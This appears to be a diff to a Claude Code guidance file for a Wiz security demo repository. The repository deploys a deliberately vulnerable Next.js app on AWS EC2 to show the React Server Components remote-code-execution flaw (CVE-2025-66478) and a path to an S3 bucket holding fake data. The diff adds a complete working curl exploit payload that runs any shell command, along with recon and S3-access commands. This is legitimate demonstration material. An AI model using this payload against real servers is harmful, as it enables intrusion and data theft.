@@ -4,7 +4,7 @@ This file provides guidance to Claude Code (claude.ai/code) when working with th
 
 ## Project Overview
 
-This is a **Wiz security demo environment** showcasing the React Server Components RCE vulnerability (React2Shell, CVE-2025-66478). The demo runs on AWS EKS with Terraform IaC.
+This is a **Wiz security demo environment** showcasing the React Server Components RCE vulnerability (React2Shell, CVE-2025-66478). The demo runs on AWS EC2 with Terraform IaC.
 
 ### Demo Purpose
 
@@ -17,17 +17,14 @@ Demonstrates Wiz platform capabilities:
 ### Attack Path Narrative
 
 ```
-Internet → LoadBalancer → EKS Pod (RCE via RSC) → Node IAM Role → Sensitive S3 Bucket
+Internet → EC2:3000 → Docker Container (RCE via RSC) → Instance IAM Role → Sensitive S3 Bucket
 ```
 
 ## Repository Structure
 
 ```
 app/nextjs/           # Vulnerable Next.js 16.0.6 application (React 19.2.0)
-infra/aws/            # Terraform: VPC, EKS, S3, ECR, IAM
-infra/k8s/            # Kubernetes manifests (TODO)
-ci/                   # CI pipelines (TODO)
-docs/                 # Documentation (TODO)
+infra/aws/            # Terraform: VPC, EC2, S3, ECR, IAM
 wizcli                # Wiz CLI binary
 ```
 
@@ -57,7 +54,7 @@ docker run --rm -p 3000:3000 wiz-rsc-demo:latest
 cd infra/aws
 terraform init
 terraform plan
-terraform apply
+terraform apply      # Outputs: app_url, ec2_public_ip, s3_bucket_name
 terraform destroy
 ```
 
@@ -72,27 +69,55 @@ terraform destroy
 
 ### Infrastructure Design
 
-- **No IRSA**: Pods inherit permissions from EKS node IAM role (intentionally over-permissive)
-- **No TLS/ALB Ingress**: Simple Kubernetes LoadBalancer service (HTTP only)
-- **Public S3 bucket**: Contains fake sensitive data (`employees.json`, `salaries.csv`, etc.)
+- **EC2 + Docker**: Single instance running the vulnerable container
+- **Over-permissive IAM**: Instance profile has S3 read access (lateral movement path)
+- **Public S3 bucket**: Contains fake sensitive data (`employees.json`, `roadmap_2025_confidential.txt`)
+- **No TLS**: HTTP only on port 3000
 
-### App Routes (Target Design)
+### App Routes
 
-- `/` – Landing page
-- `/status` – Shows hostname and banner (reads `/tmp/banner.json` if present)
-- `/data` – Reads fake sensitive data from S3
+- `/` – Landing page (changes to "PWNED" when `/tmp/banner.json` exists)
 
 ### RCE Demo Capabilities
 
-When exploited, the app should allow:
+When exploited via CVE-2025-66478, the app allows:
 1. Recon commands: `whoami`, `id`, `uname -a`, `cat /etc/passwd`
-2. File writes: `/tmp/pwned.txt`, `/tmp/banner.json`
-3. AWS access: `aws s3 ls`, `aws s3 cp` using node IAM role
+2. File writes: `/tmp/pwned.txt`, `/tmp/banner.json` (triggers UI change)
+3. AWS access: `aws s3 ls`, `aws s3 cp` using instance IAM role
+
+## Exploit Payload (CVE-2025-66478)
+
+```bash
+curl -X POST http://<TARGET>:3000 \
+  -H "Next-Action: x" \
+  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
+  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name="0"\r
+\r
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\\"then\\\":\\\"$B1337\\\"}","_response":{"_prefix":"process.mainModule.require('"'"'child_process'"'"').execSync('"'"'YOUR_COMMAND_HERE'"'"');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name="1"\r
+\r
+"$@0"\r
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name="2"\r
+\r
+[]\r
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
+'
+```
+
+**Usage:** Replace `YOUR_COMMAND_HERE` with any shell command.
+
+**Notes:**
+- No Action ID needed - use `Next-Action: x` header
+- Single quotes in commands need escaping: `'"'"'`
+- Base64 encoding simplifies complex payloads
 
 ## Working Style Rules
 
 1. **One major thing at a time** – Focus on the current task only
-2. **Keep complexity low** – Prefer simple, readable Terraform and YAML
+2. **Keep complexity low** – Prefer simple, readable Terraform
 3. **No real secrets** – Use fake/demo data only
 4. **Full-file outputs** – Show complete files, not diffs
 5. **Be explicit about assumptions** – Document version choices
@@ -101,14 +126,13 @@ When exploited, the app should allow:
 ## Current State
 
 - ✅ Next.js app scaffolded with vulnerable versions
-- ✅ Basic Terraform structure for AWS infra
-- ⏳ Kubernetes manifests (TODO)
-- ⏳ S3 bucket with fake sensitive data (TODO)
-- ⏳ Full RCE exploit endpoint (TODO)
-- ⏳ `/status` and `/data` routes (TODO)
+- ✅ Docker build working
+- ✅ Terraform for EC2 + S3 + IAM
+- ✅ S3 bucket with fake sensitive data
+- ✅ RCE exploit works (CVE-2025-66478)
 
 ## Security Warning
 
 > **DO NOT DEPLOY TO PRODUCTION**
-> 
+>
 > This repository contains intentionally vulnerable code for security demonstration purposes only.
